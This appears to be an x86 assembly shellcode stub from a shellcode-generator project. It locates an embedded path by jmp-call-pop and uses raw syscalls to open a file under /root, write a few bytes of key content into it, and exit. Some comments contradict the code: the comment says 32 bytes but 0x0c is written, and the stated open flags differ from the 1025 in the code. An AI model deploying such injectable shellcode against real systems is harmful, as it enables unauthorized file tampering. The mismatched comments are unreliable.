# eax, ecx = temporary
# edx = fd


jmp data_path
thestart1:

popl %ebx           ## ebx = filepath
movl %ebx, %esi     
addl $0x38, %esi    ## esi = key

xorl %eax, %eax
movw $1025, %ax
push %eax
push %ebx        ##file path
push %ebx        ##dummy
xorl %eax, %eax
movb $5, %al
int $0x80
movl %eax, %edx

######## edx=open (filepath, 1, 0)

xorl %eax, %eax
movb $0x0c, %al
push %eax        ## 32 bytes
push %esi        ## buff
movl %edx, %eax  ## write to the file
push %eax
push %eax        ## dummy
movb $4, %al
int $0x80
######## write (edx, esi, 32)

movb $1, %al
int $0x80
######## exit()

data_path:
call thestart1
.ascii "/root/demian_override/shellcode/scodeGenerator/stub/key\0"
.ascii "key contents\0"

